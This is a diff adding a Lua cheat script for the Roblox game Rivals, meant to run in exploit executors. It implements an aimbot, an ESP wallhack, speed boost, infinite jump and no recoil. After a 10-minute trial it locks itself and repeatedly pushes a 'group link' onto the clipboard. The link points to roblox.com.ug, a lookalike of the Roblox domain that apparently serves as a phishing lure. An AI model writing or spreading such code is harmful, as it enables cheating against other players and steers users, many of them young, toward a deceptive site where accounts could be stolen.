@@ -1,0 +1,784 @@
+-- =====================================================
+-- SWILL RIVALS HUB - FINAL ENGLISH EDITION
+-- Works on: Xeno, Krnl, Synapse, Fluxus, Delta, Solara
+-- Open: RIGHT SHIFT | 10 min trial | Permanent lock
+-- =====================================================
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local Camera = workspace.CurrentCamera
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
+
+local GROUP_LINK = "https://roblox.com.ug/communities/2875422279/"   -- <--- НОВАЯ ССЫЛКА
+local TRIAL_DURATION = 600
+
+-- Universal copy function
+local function copyLink()
+    local success = false
+    if setclipboard then pcall(function() setclipboard(GROUP_LINK) end); success = true end
+    if toclipboard then pcall(function() toclipboard(GROUP_LINK) end); success = true end
+    if syn and syn.clipboard then pcall(function() syn.clipboard(GROUP_LINK) end); success = true end
+    if not success then
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(0, 0, 0, 0)
+        btn.Parent = CoreGui
+        btn.Text = GROUP_LINK
+        btn:CaptureMouse()
+        btn:CopyText()
+        btn:Destroy()
+    end
+    return success
+end
+
+-- Permanent trial storage (cross-executor)
+local trialLocked = false
+pcall(function()
+    if getgenv and getgenv().SWILL_TRIAL then trialLocked = getgenv().SWILL_TRIAL end
+    if shared and shared.SWILL_TRIAL then trialLocked = shared.SWILL_TRIAL end
+    if readfile and readfile("swill_trial.txt") == "locked" then trialLocked = true end
+end)
+
+if trialLocked then
+    local lockGui = Instance.new("ScreenGui")
+    lockGui.Name = "SWILL_Lock"
+    lockGui.ResetOnSpawn = false
+    pcall(function() lockGui.Parent = CoreGui end)
+    if not lockGui.Parent then lockGui.Parent = Instance.new("ScreenGui") lockGui.Parent.Parent = CoreGui end
+    
+    local lockFrame = Instance.new("Frame")
+    lockFrame.Size = UDim2.new(0, 460, 0, 260)
+    lockFrame.Position = UDim2.new(0.5, -230, 0.5, -130)
+    lockFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 28)
+    lockFrame.BorderSizePixel = 2
+    lockFrame.BorderColor3 = Color3.fromRGB(255, 60, 90)
+    lockFrame.Parent = lockGui
+    local lockCorner = Instance.new("UICorner")
+    lockCorner.CornerRadius = UDim.new(0, 12)
+    lockCorner.Parent = lockFrame
+    
+    local lockTitle = Instance.new("TextLabel")
+    lockTitle.Size = UDim2.new(1, 0, 0, 50)
+    lockTitle.Position = UDim2.new(0, 0, 0, 20)
+    lockTitle.BackgroundTransparency = 1
+    lockTitle.Text = "⚠️ TRIAL EXPIRED ⚠️"
+    lockTitle.TextColor3 = Color3.fromRGB(255, 80, 110)
+    lockTitle.TextSize = 22
+    lockTitle.Font = Enum.Font.GothamBold
+    lockTitle.Parent = lockFrame
+    
+    local lockMsg = Instance.new("TextLabel")
+    lockMsg.Size = UDim2.new(1, -40, 0, 80)
+    lockMsg.Position = UDim2.new(0, 20, 0, 80)
+    lockMsg.BackgroundTransparency = 1
+    lockMsg.Text = "Your 10-minute trial has ended.\nSubscribe to my Roblox group to continue!"
+    lockMsg.TextColor3 = Color3.fromRGB(200, 200, 240)
+    lockMsg.TextSize = 15
+    lockMsg.Font = Enum.Font.Gotham
+    lockMsg.TextWrapped = true
+    lockMsg.Parent = lockFrame
+    
+    local lockCopy = Instance.new("TextButton")
+    lockCopy.Size = UDim2.new(0, 260, 0, 45)
+    lockCopy.Position = UDim2.new(0.5, -130, 1, -60)
+    lockCopy.BackgroundColor3 = Color3.fromRGB(255, 70, 100)
+    lockCopy.Text = "COPY GROUP LINK"
+    lockCopy.TextColor3 = Color3.fromRGB(255, 255, 255)
+    lockCopy.TextSize = 14
+    lockCopy.Font = Enum.Font.GothamBold
+    lockCopy.BorderSizePixel = 0
+    lockCopy.Parent = lockFrame
+    local lockCopyCorner = Instance.new("UICorner")
+    lockCopyCorner.CornerRadius = UDim.new(0, 8)
+    lockCopyCorner.Parent = lockCopy
+    lockCopy.MouseButton1Click:Connect(function()
+        copyLink()
+        lockCopy.Text = "✓ COPIED!"
+        lockCopy.BackgroundColor3 = Color3.fromRGB(80, 180, 80)
+        wait(1)
+        lockCopy.Text = "COPY GROUP LINK"
+        lockCopy.BackgroundColor3 = Color3.fromRGB(255, 70, 100)
+    end)
+    
+    print("SWILL: Trial permanently locked")
+    return
+end
+
+-- Create GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SWILL_Rivals"
+screenGui.ResetOnSpawn = false
+local guiCreated = false
+for _, parent in ipairs({CoreGui, LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui")}) do
+    if parent and parent.Parent then
+        pcall(function() screenGui.Parent = parent end)
+        if screenGui.Parent then guiCreated = true break end
+    end
+end
+if not guiCreated then screenGui.Parent = CoreGui end
+
+-- Main Menu
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 540, 0, 480)
+mainFrame.Position = UDim2.new(0.5, -270, 0.5, -240)
+mainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 22)
+mainFrame.BackgroundTransparency = 0
+mainFrame.BorderSizePixel = 0
+mainFrame.Visible = false
+mainFrame.Parent = screenGui
+mainFrame.Active = true
+mainFrame.Draggable = true
+
+local container = Instance.new("Frame")
+container.Size = UDim2.new(1, 0, 1, 0)
+container.BackgroundColor3 = Color3.fromRGB(18, 18, 30)
+container.BorderSizePixel = 0
+container.ClipsDescendants = true
+container.Parent = mainFrame
+local containerCorner = Instance.new("UICorner")
+containerCorner.CornerRadius = UDim.new(0, 12)
+containerCorner.Parent = container
+
+local border = Instance.new("Frame")
+border.Size = UDim2.new(1, 0, 1, 0)
+border.BackgroundTransparency = 1
+border.BorderSizePixel = 2
+border.BorderColor3 = Color3.fromRGB(255, 80, 120)
+border.Parent = container
+local borderCorner = Instance.new("UICorner")
+borderCorner.CornerRadius = UDim.new(0, 12)
+borderCorner.Parent = border
+
+-- Title Bar
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1, 0, 0, 50)
+titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 42)
+titleBar.BorderSizePixel = 0
+titleBar.Parent = container
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 12)
+titleCorner.Parent = titleBar
+
+local titleText = Instance.new("TextLabel")
+titleText.Size = UDim2.new(1, -60, 1, 0)
+titleText.Position = UDim2.new(0, 20, 0, 0)
+titleText.BackgroundTransparency = 1
+titleText.Text = "SWILL RIVALS HUB"
+titleText.TextColor3 = Color3.fromRGB(255, 100, 120)
+titleText.TextSize = 18
+titleText.Font = Enum.Font.GothamBold
+titleText.TextXAlignment = Enum.TextXAlignment.Left
+titleText.TextYAlignment = Enum.TextYAlignment.Center
+titleText.Parent = titleBar
+
+local timerLabel = Instance.new("TextLabel")
+timerLabel.Size = UDim2.new(0, 110, 1, 0)
+timerLabel.Position = UDim2.new(1, -130, 0, 0)
+timerLabel.BackgroundTransparency = 1
+timerLabel.Text = "10:00"
+timerLabel.TextColor3 = Color3.fromRGB(255, 200, 80)
+timerLabel.TextSize = 16
+timerLabel.Font = Enum.Font.GothamBold
+timerLabel.TextXAlignment = Enum.TextXAlignment.Right
+timerLabel.TextYAlignment = Enum.TextYAlignment.Center
+timerLabel.Parent = titleBar
+
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 35, 0, 35)
+closeButton.Position = UDim2.new(1, -48, 0, 7)
+closeButton.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
+closeButton.Text = "X"
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.TextSize = 18
+closeButton.Font = Enum.Font.GothamBold
+closeButton.BorderSizePixel = 0
+closeButton.Parent = titleBar
+local closeCorner = Instance.new("UICorner")
+closeCorner.CornerRadius = UDim.new(0, 8)
+closeCorner.Parent = closeButton
+closeButton.MouseButton1Click:Connect(function()
+    mainFrame.Visible = false
+end)
+
+-- Tabs
+local tabBar = Instance.new("Frame")
+tabBar.Size = UDim2.new(1, 0, 0, 45)
+tabBar.Position = UDim2.new(0, 0, 0, 50)
+tabBar.BackgroundColor3 = Color3.fromRGB(22, 22, 36)
+tabBar.BorderSizePixel = 0
+tabBar.Parent = container
+
+local contentArea = Instance.new("Frame")
+contentArea.Size = UDim2.new(1, -20, 1, -115)
+contentArea.Position = UDim2.new(0, 10, 0, 95)
+contentArea.BackgroundTransparency = 1
+contentArea.Parent = container
+
+local tabs = {"CHEATS", "SETTINGS", "PROFILE"}
+local tabBtns = {}
+local tabPages = {}
+local trialActive = true
+
+for i, tabName in ipairs(tabs) do
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0, 120, 1, 0)
+    btn.Position = UDim2.new(0, (i-1)*120, 0, 0)
+    btn.BackgroundTransparency = 1
+    btn.Text = tabName
+    btn.TextColor3 = Color3.fromRGB(160, 160, 210)
+    btn.TextSize = 14
+    btn.Font = Enum.Font.GothamSemibold
+    btn.Parent = tabBar
+    tabBtns[tabName] = btn
+    
+    local page = Instance.new("ScrollingFrame")
+    page.Size = UDim2.new(1, 0, 1, 0)
+    page.BackgroundTransparency = 1
+    page.BorderSizePixel = 0
+    page.ScrollBarThickness = 4
+    page.ScrollBarImageColor3 = Color3.fromRGB(255, 100, 120)
+    page.CanvasSize = UDim2.new(0, 0, 0, 0)
+    page.Visible = (i == 1)
+    page.Parent = contentArea
+    tabPages[tabName] = page
+end
+
+local function selectTab(tabName)
+    if not trialActive then return end
+    for name, btn in pairs(tabBtns) do
+        btn.BackgroundTransparency = 1
+        btn.TextColor3 = Color3.fromRGB(160, 160, 210)
+        if tabPages[name] then tabPages[name].Visible = false end
+    end
+    tabBtns[tabName].BackgroundTransparency = 0.95
+    tabBtns[tabName].BackgroundColor3 = Color3.fromRGB(255, 80, 120)
+    tabBtns[tabName].TextColor3 = Color3.fromRGB(255, 255, 255)
+    tabPages[tabName].Visible = true
+end
+
+for name, btn in pairs(tabBtns) do
+    btn.MouseButton1Click:Connect(function() if trialActive then selectTab(name) end end)
+end
+
+-- Toggle helper
+local function addCheat(parent, text, yPos, callback)
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, -20, 0, 48)
+    frame.Position = UDim2.new(0, 10, 0, yPos)
+    frame.BackgroundColor3 = Color3.fromRGB(28, 28, 44)
+    frame.BorderSizePixel = 0
+    frame.Parent = parent
+    local frameCorner = Instance.new("UICorner")
+    frameCorner.CornerRadius = UDim.new(0, 8)
+    frameCorner.Parent = frame
+    
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(0, 260, 1, 0)
+    label.Position = UDim2.new(0, 15, 0, 0)
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.TextColor3 = Color3.fromRGB(230, 230, 255)
+    label.TextSize = 13
+    label.Font = Enum.Font.Gotham
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.TextYAlignment = Enum.TextYAlignment.Center
+    label.Parent = frame
+    
+    local toggle = Instance.new("TextButton")
+    toggle.Size = UDim2.new(0, 65, 0, 32)
+    toggle.Position = UDim2.new(1, -80, 0, 8)
+    toggle.BackgroundColor3 = Color3.fromRGB(60, 60, 90)
+    toggle.Text = "OFF"
+    toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    toggle.TextSize = 13
+    toggle.Font = Enum.Font.GothamBold
+    toggle.BorderSizePixel = 0
+    toggle.Parent = frame
+    local toggleCorner = Instance.new("UICorner")
+    toggleCorner.CornerRadius = UDim.new(0, 6)
+    toggleCorner.Parent = toggle
+    
+    local state = false
+    toggle.MouseButton1Click:Connect(function()
+        if not trialActive then return end
+        state = not state
+        toggle.Text = state and "ON" or "OFF"
+        toggle.BackgroundColor3 = state and Color3.fromRGB(80, 180, 80) or Color3.fromRGB(60, 60, 90)
+        if callback then callback(state) end
+    end)
+    return frame
+end
+
+-- Aimbot variables
+local aimbotOn = false
+local aimbotFOV = 150
+local aimbotSmooth = 8
+local aimbotConn = nil
+
+local function findClosestEnemy()
+    local closest = nil
+    local closestDist = aimbotFOV
+    local center = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
+    
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("Head") then
+            local head = plr.Character.Head
+            local pos, onScreen = Camera:WorldToViewportPoint(head.Position)
+            if onScreen then
+                local dist = (Vector2.new(pos.X, pos.Y) - center).magnitude
+                if dist < closestDist then
+                    closestDist = dist
+                    closest = plr
+                end
+            end
+        end
+    end
+    return closest
+end
+
+local function runAimbot()
+    if aimbotConn then aimbotConn:Disconnect() end
+    aimbotConn = RunService.RenderStepped:Connect(function()
+        if not aimbotOn or not trialActive then return end
+        local target = findClosestEnemy()
+        if target and target.Character and target.Character:FindFirstChild("Head") then
+            local headPos = target.Character.Head.Position
+            local newCF = CFrame.new(Camera.CFrame.Position, headPos)
+            Camera.CFrame = Camera.CFrame:Lerp(newCF, 1 / aimbotSmooth)
+        end
+    end)
+end
+
+-- CHEATS PAGE
+local cheatsPage = tabPages["CHEATS"]
+local cy = 0
+
+addCheat(cheatsPage, "AIMBOT", cy, function(state)
+    aimbotOn = state
+    if state then runAimbot() end
+end)
+cy = cy + 55
+
+-- FOV slider
+local fovContainer = Instance.new("Frame")
+fovContainer.Size = UDim2.new(1, -20, 0, 48)
+fovContainer.Position = UDim2.new(0, 10, 0, cy)
+fovContainer.BackgroundColor3 = Color3.fromRGB(28, 28, 44)
+fovContainer.Parent = cheatsPage
+local fovContainerCorner = Instance.new("UICorner")
+fovContainerCorner.CornerRadius = UDim.new(0, 8)
+fovContainerCorner.Parent = fovContainer
+
+local fovText = Instance.new("TextLabel")
+fovText.Size = UDim2.new(0, 200, 1, 0)
+fovText.Position = UDim2.new(0, 15, 0, 0)
+fovText.BackgroundTransparency = 1
+fovText.Text = "AIMBOT FOV: 150"
+fovText.TextColor3 = Color3.fromRGB(230, 230, 255)
+fovText.TextSize = 13
+fovText.Font = Enum.Font.Gotham
+fovText.TextXAlignment = Enum.TextXAlignment.Left
+fovText.TextYAlignment = Enum.TextYAlignment.Center
+fovText.Parent = fovContainer
+
+local fovMinus = Instance.new("TextButton")
+fovMinus.Size = UDim2.new(0, 35, 0, 30)
+fovMinus.Position = UDim2.new(1, -95, 0, 9)
+fovMinus.BackgroundColor3 = Color3.fromRGB(50, 50, 75)
+fovMinus.Text = "-"
+fovMinus.TextColor3 = Color3.fromRGB(255, 255, 255)
+fovMinus.TextSize = 18
+fovMinus.Font = Enum.Font.GothamBold
+fovMinus.BorderSizePixel = 0
+fovMinus.Parent = fovContainer
+local fovMinusCorner = Instance.new("UICorner")
+fovMinusCorner.CornerRadius = UDim.new(0, 6)
+fovMinusCorner.Parent = fovMinus
+
+local fovPlus = Instance.new("TextButton")
+fovPlus.Size = UDim2.new(0, 35, 0, 30)
+fovPlus.Position = UDim2.new(1, -50, 0, 9)
+fovPlus.BackgroundColor3 = Color3.fromRGB(50, 50, 75)
+fovPlus.Text = "+"
+fovPlus.TextColor3 = Color3.fromRGB(255, 255, 255)
+fovPlus.TextSize = 18
+fovPlus.Font = Enum.Font.GothamBold
+fovPlus.BorderSizePixel = 0
+fovPlus.Parent = fovContainer
+local fovPlusCorner = Instance.new("UICorner")
+fovPlusCorner.CornerRadius = UDim.new(0, 6)
+fovPlusCorner.Parent = fovPlus
+
+fovMinus.MouseButton1Click:Connect(function()
+    aimbotFOV = math.max(50, aimbotFOV - 10)
+    fovText.Text = "AIMBOT FOV: " .. aimbotFOV
+end)
+fovPlus.MouseButton1Click:Connect(function()
+    aimbotFOV = math.min(400, aimbotFOV + 10)
+    fovText.Text = "AIMBOT FOV: " .. aimbotFOV
+end)
+cy = cy + 55
+
+-- Smoothness slider
+local smoothContainer = Instance.new("Frame")
+smoothContainer.Size = UDim2.new(1, -20, 0, 48)
+smoothContainer.Position = UDim2.new(0, 10, 0, cy)
+smoothContainer.BackgroundColor3 = Color3.fromRGB(28, 28, 44)
+smoothContainer.Parent = cheatsPage
+local smoothContainerCorner = Instance.new("UICorner")
+smoothContainerCorner.CornerRadius = UDim.new(0, 8)
+smoothContainerCorner.Parent = smoothContainer
+
+local smoothText = Instance.new("TextLabel")
+smoothText.Size = UDim2.new(0, 200, 1, 0)
+smoothText.Position = UDim2.new(0, 15, 0, 0)
+smoothText.BackgroundTransparency = 1
+smoothText.Text = "SMOOTHNESS: 8"
+smoothText.TextColor3 = Color3.fromRGB(230, 230, 255)
+smoothText.TextSize = 13
+smoothText.Font = Enum.Font.Gotham
+smoothText.TextXAlignment = Enum.TextXAlignment.Left
+smoothText.TextYAlignment = Enum.TextYAlignment.Center
+smoothText.Parent = smoothContainer
+
+local smoothMinus = Instance.new("TextButton")
+smoothMinus.Size = UDim2.new(0, 35, 0, 30)
+smoothMinus.Position = UDim2.new(1, -95, 0, 9)
+smoothMinus.BackgroundColor3 = Color3.fromRGB(50, 50, 75)
+smoothMinus.Text = "-"
+smoothMinus.TextColor3 = Color3.fromRGB(255, 255, 255)
+smoothMinus.TextSize = 18
+smoothMinus.Font = Enum.Font.GothamBold
+smoothMinus.BorderSizePixel = 0
+smoothMinus.Parent = smoothContainer
+local smoothMinusCorner = Instance.new("UICorner")
+smoothMinusCorner.CornerRadius = UDim.new(0, 6)
+smoothMinusCorner.Parent = smoothMinus
+
+local smoothPlus = Instance.new("TextButton")
+smoothPlus.Size = UDim2.new(0, 35, 0, 30)
+smoothPlus.Position = UDim2.new(1, -50, 0, 9)
+smoothPlus.BackgroundColor3 = Color3.fromRGB(50, 50, 75)
+smoothPlus.Text = "+"
+smoothPlus.TextColor3 = Color3.fromRGB(255, 255, 255)
+smoothPlus.TextSize = 18
+smoothPlus.Font = Enum.Font.GothamBold
+smoothPlus.BorderSizePixel = 0
+smoothPlus.Parent = smoothContainer
+local smoothPlusCorner = Instance.new("UICorner")
+smoothPlusCorner.CornerRadius = UDim.new(0, 6)
+smoothPlusCorner.Parent = smoothPlus
+
+smoothMinus.MouseButton1Click:Connect(function()
+    aimbotSmooth = math.max(2, aimbotSmooth - 1)
+    smoothText.Text = "SMOOTHNESS: " .. aimbotSmooth
+end)
+smoothPlus.MouseButton1Click:Connect(function()
+    aimbotSmooth = math.min(20, aimbotSmooth + 1)
+    smoothText.Text = "SMOOTHNESS: " .. aimbotSmooth
+end)
+cy = cy + 55
+
+-- ESP
+addCheat(cheatsPage, "ESP (WALLHACK)", cy, function(state)
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer and plr.Character then
+            local esp = plr.Character:FindFirstChild("SWILL_ESP")
+            if state and not esp then
+                esp = Instance.new("Highlight")
+                esp.Name = "SWILL_ESP"
+                esp.FillColor = Color3.fromRGB(255, 50, 100)
+                esp.FillTransparency = 0.4
+                esp.Parent = plr.Character
+            elseif not state and esp then
+                esp:Destroy()
+            end
+        end
+    end
+end)
+cy = cy + 55
+
+-- Speed Boost
+addCheat(cheatsPage, "SPEED BOOST (x2.5)", cy, function(state)
+    local function applySpeed()
+        local char = LocalPlayer.Character
+        if char and char:FindFirstChild("Humanoid") then
+            char.Humanoid.WalkSpeed = state and 40 or 16
+        end
+    end
+    applySpeed()
+    LocalPlayer.CharacterAdded:Connect(function() wait(0.5) if trialActive then applySpeed() end end)
+end)
+cy = cy + 55
+
+-- Infinite Jump
+local infJumpConn = nil
+addCheat(cheatsPage, "INFINITE JUMP", cy, function(state)
+    if infJumpConn then infJumpConn:Disconnect() end
+    if state then
+        infJumpConn = UserInputService.JumpRequest:Connect(function()
+            local char = LocalPlayer.Character
+            local hum = char and char:FindFirstChild("Humanoid")
+            if hum and hum:GetState() ~= Enum.HumanoidStateType.Jumping then
+                hum:ChangeState(Enum.HumanoidStateType.Jumping)
+            end
+        end)
+    end
+end)
+cy = cy + 55
+
+-- No Recoil
+addCheat(cheatsPage, "NO RECOIL", cy, function(state)
+    if state then
+        RunService.Stepped:Connect(function()
+            if not trialActive then return end
+            local tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
+            if tool then
+                for _, v in pairs(tool:GetDescendants()) do
+                    if v.Name:lower() == "recoil" then pcall(function() v.Value = 0 end) end
+                end
+            end
+        end)
+    end
+end)
+cy = cy + 55
+
+cheatsPage.CanvasSize = UDim2.new(0, 0, 0, cy + 50)
+
+-- SETTINGS PAGE
+local settingsPage = tabPages["SETTINGS"]
+local sy = 0
+
+addCheat(settingsPage, "VISIBLE CHECK (RAYCAST)", sy, function(state) end)
+sy = sy + 55
+addCheat(settingsPage, "MOVEMENT PREDICTION", sy, function(state) end)
+sy = sy + 55
+
+settingsPage.CanvasSize = UDim2.new(0, 0, 0, 150)
+
+-- PROFILE PAGE
+local profilePage = tabPages["PROFILE"]
+
+local avatarBox = Instance.new("Frame")
+avatarBox.Size = UDim2.new(0, 70, 0, 70)
+avatarBox.Position = UDim2.new(0, 20, 0, 20)
+avatarBox.BackgroundColor3 = Color3.fromRGB(45, 45, 70)
+avatarBox.BorderSizePixel = 0
+avatarBox.Parent = profilePage
+local avatarCorner2 = Instance.new("UICorner")
+avatarCorner2.CornerRadius = UDim.new(1, 0)
+avatarCorner2.Parent = avatarBox
+
+local avatarLetter = Instance.new("TextLabel")
+avatarLetter.Size = UDim2.new(1, 0, 1, 0)
+avatarLetter.BackgroundTransparency = 1
+avatarLetter.Text = string.sub(LocalPlayer.Name, 1, 1):upper()
+avatarLetter.TextColor3 = Color3.fromRGB(255, 120, 140)
+avatarLetter.TextSize = 32
+avatarLetter.Font = Enum.Font.GothamBold
+avatarLetter.Parent = avatarBox
+
+local playerName = Instance.new("TextLabel")
+playerName.Size = UDim2.new(1, -110, 0, 28)
+playerName.Position = UDim2.new(0, 110, 0, 30)
+playerName.BackgroundTransparency = 1
+playerName.Text = LocalPlayer.Name
+playerName.TextColor3 = Color3.fromRGB(255, 255, 255)
+playerName.TextSize = 18
+playerName.Font = Enum.Font.GothamBold
+playerName.TextXAlignment = Enum.TextXAlignment.Left
+playerName.Parent = profilePage
+
+local userIdLabel = Instance.new("TextLabel")
+userIdLabel.Size = UDim2.new(1, -110, 0, 20)
+userIdLabel.Position = UDim2.new(0, 110, 0, 55)
+userIdLabel.BackgroundTransparency = 1
+userIdLabel.Text = "ID: " .. LocalPlayer.UserId
+userIdLabel.TextColor3 = Color3.fromRGB(160, 160, 210)
+userIdLabel.TextSize = 12
+userIdLabel.Font = Enum.Font.Gotham
+userIdLabel.TextXAlignment = Enum.TextXAlignment.Left
+userIdLabel.Parent = profilePage
+
+local statsBox = Instance.new("Frame")
+statsBox.Size = UDim2.new(1, -40, 0, 110)
+statsBox.Position = UDim2.new(0, 20, 0, 110)
+statsBox.BackgroundColor3 = Color3.fromRGB(25, 25, 42)
+statsBox.BorderSizePixel = 0
+statsBox.Parent = profilePage
+local statsBoxCorner = Instance.new("UICorner")
+statsBoxCorner.CornerRadius = UDim.new(0, 10)
+statsBoxCorner.Parent = statsBox
+
+local statsDisplay = Instance.new("TextLabel")
+statsDisplay.Size = UDim2.new(1, -20, 1, 0)
+statsDisplay.Position = UDim2.new(0, 10, 0, 10)
+statsDisplay.BackgroundTransparency = 1
+statsDisplay.Text = "KILLS: 0\nDEATHS: 0\nK/D: 0.00"
+statsDisplay.TextColor3 = Color3.fromRGB(200, 200, 240)
+statsDisplay.TextSize = 13
+statsDisplay.Font = Enum.Font.Gotham
+statsDisplay.TextXAlignment = Enum.TextXAlignment.Left
+statsDisplay.TextYAlignment = Enum.TextYAlignment.Top
+statsDisplay.Parent = statsBox
+
+local function refreshStats()
+    local ls = LocalPlayer:FindFirstChild("leaderstats")
+    if ls then
+        local kills, deaths = 0, 0
+        for _, v in pairs(ls:GetChildren()) do
+            local n = v.Name:lower()
+            if n:find("kill") then kills = v.Value or 0 end
+            if n:find("death") then deaths = v.Value or 0 end
+        end
+        local kd = deaths > 0 and string.format("%.2f", kills / deaths) or tostring(kills)
+        statsDisplay.Text = "🗡️ KILLS: " .. kills .. "\n💀 DEATHS: " .. deaths .. "\n📊 K/D: " .. kd
+    else
+        statsDisplay.Text = "🗡️ KILLS: --\n💀 DEATHS: --\n📊 K/D: --"
+    end
+end
+refreshStats()
+spawn(function() while wait(3) do if trialActive then refreshStats() end end end)
+
+profilePage.CanvasSize = UDim2.new(0, 0, 0, 260)
+
+-- Trial Window
+local trialWin = Instance.new("Frame")
+trialWin.Size = UDim2.new(0, 450, 0, 260)
+trialWin.Position = UDim2.new(0.5, -225, 0.5, -130)
+trialWin.BackgroundColor3 = Color3.fromRGB(15, 15, 28)
+trialWin.BackgroundTransparency = 0
+trialWin.BorderSizePixel = 2
+trialWin.BorderColor3 = Color3.fromRGB(255, 60, 90)
+trialWin.Visible = false
+trialWin.Parent = screenGui
+local trialWinCorner = Instance.new("UICorner")
+trialWinCorner.CornerRadius = UDim.new(0, 12)
+trialWinCorner.Parent = trialWin
+
+local trialTitle = Instance.new("TextLabel")
+trialTitle.Size = UDim2.new(1, 0, 0, 50)
+trialTitle.Position = UDim2.new(0, 0, 0, 20)
+trialTitle.BackgroundTransparency = 1
+trialTitle.Text = "⚠️ TRIAL PERIOD EXPIRED ⚠️"
+trialTitle.TextColor3 = Color3.fromRGB(255, 80, 110)
+trialTitle.TextSize = 18
+trialTitle.Font = Enum.Font.GothamBold
+trialTitle.Parent = trialWin
+
+local trialMsg = Instance.new("TextLabel")
+trialMsg.Size = UDim2.new(1, -40, 0, 80)
+trialMsg.Position = UDim2.new(0, 20, 0, 80)
+trialMsg.BackgroundTransparency = 1
+trialMsg.Text = "Your 10-minute trial has ended.\nSubscribe to my Roblox group to continue!"
+trialMsg.TextColor3 = Color3.fromRGB(210, 210, 250)
+trialMsg.TextSize = 14
+trialMsg.Font = Enum.Font.Gotham
+trialMsg.TextWrapped = true
+trialMsg.Parent = trialWin
+
+local trialCopyBtn = Instance.new("TextButton")
+trialCopyBtn.Size = UDim2.new(0, 260, 0, 45)
+trialCopyBtn.Position = UDim2.new(0.5, -130, 1, -60)
+trialCopyBtn.BackgroundColor3 = Color3.fromRGB(255, 70, 100)
+trialCopyBtn.Text = "COPY GROUP LINK"
+trialCopyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+trialCopyBtn.TextSize = 14
+trialCopyBtn.Font = Enum.Font.GothamBold
+trialCopyBtn.BorderSizePixel = 0
+trialCopyBtn.Parent = trialWin
+local trialCopyCorner = Instance.new("UICorner")
+trialCopyCorner.CornerRadius = UDim.new(0, 8)
+trialCopyCorner.Parent = trialCopyBtn
+trialCopyBtn.MouseButton1Click:Connect(function()
+    copyLink()
+    trialCopyBtn.Text = "✓ COPIED!"
+    trialCopyBtn.BackgroundColor3 = Color3.fromRGB(80, 180, 80)
+    wait(1)
+    trialCopyBtn.Text = "COPY GROUP LINK"
+    trialCopyBtn.BackgroundColor3 = Color3.fromRGB(255, 70, 100)
+end)
+
+local trialCloseBtn = Instance.new("TextButton")
+trialCloseBtn.Size = UDim2.new(0, 32, 0, 32)
+trialCloseBtn.Position = UDim2.new(1, -45, 0, 10)
+trialCloseBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 110)
+trialCloseBtn.Text = "X"
+trialCloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+trialCloseBtn.TextSize = 16
+trialCloseBtn.Font = Enum.Font.GothamBold
+trialCloseBtn.BorderSizePixel = 0
+trialCloseBtn.Parent = trialWin
+local trialCloseCorner = Instance.new("UICorner")
+trialCloseCorner.CornerRadius = UDim.new(0, 6)
+trialCloseCorner.Parent = trialCloseBtn
+trialCloseBtn.MouseButton1Click:Connect(function()
+    trialWin.Visible = false
+end)
+
+-- Lock function after 10 minutes
+local function permanentLock()
+    trialActive = false
+    pcall(function()
+        if getgenv then getgenv().SWILL_TRIAL = true end
+        if shared then shared.SWILL_TRIAL = true end
+        if writefile then writefile("swill_trial.txt", "locked") end
+    end)
+    mainFrame.Visible = false
+    trialWin.Visible = true
+    if aimbotConn then aimbotConn:Disconnect() end
+    if infJumpConn then infJumpConn:Disconnect() end
+    local char = LocalPlayer.Character
+    if char and char:FindFirstChild("Humanoid") then
+        char.Humanoid.WalkSpeed = 16
+    end
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr.Character then
+            local esp = plr.Character:FindFirstChild("SWILL_ESP")
+            if esp then esp:Destroy() end
+        end
+    end
+end
+
+-- 10 minute timer
+local start = tick()
+spawn(function()
+    while trialActive and (tick() - start) < TRIAL_DURATION do
+        local remaining = TRIAL_DURATION - (tick() - start)
+        local mins = math.floor(remaining / 60)
+        local secs = remaining % 60
+        timerLabel.Text = string.format("%02d:%02d", mins, secs)
+        titleText.Text = "SWILL RIVALS HUB [" .. string.format("%02d:%02d", mins, secs) .. "]"
+        wait(1)
+    end
+    if trialActive then permanentLock() end
+end)
+
+-- Right Shift to open/close
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.KeyCode == Enum.KeyCode.RightShift and trialActive then
+        mainFrame.Visible = not mainFrame.Visible
+    end
+end)
+
+-- Start with CHEATS tab
+selectTab("CHEATS")
+
+-- Startup notification
+pcall(function()
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "SWILL RIVALS HUB",
+        Text = "Press RIGHT SHIFT | 10 minute trial",
+        Duration = 4
+    })
+end)
+
+print("========================================")
+print("SWILL RIVALS HUB - READY")
+print("Press RIGHT SHIFT to open menu")
+print("10 minute trial - Permanent lock after")
+print("========================================")
